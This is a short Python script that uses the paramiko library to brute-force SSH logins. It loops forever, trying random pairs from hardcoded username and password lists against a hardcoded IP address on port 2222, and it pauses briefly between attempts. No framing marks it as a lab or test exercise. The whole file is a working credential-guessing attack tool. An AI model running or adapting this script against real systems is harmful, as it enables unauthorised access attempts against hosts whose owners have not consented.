import random
import time
time.sleep(random.uniform(0.1, 1.0))

import paramiko
import time
import random

HOST = " 43.241.129.85"
PORT = 2222

usernames = ["admin", "hamza", "sudo", "amaan"]
passwords = ["tryagain", "1331", "goodone", "ghazanfar", "root"]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

while True:
    username = random.choice(usernames)
    password = random.choice(passwords)

    try:
        print(f"Trying {username}:{password}")

        client.connect(
            HOST,
            port=PORT,
            username=username,
            password=password,
            timeout=2,
            allow_agent=False,
            look_for_keys=False
        )

        client.close()

    except:
        pass

    time.sleep(0.3)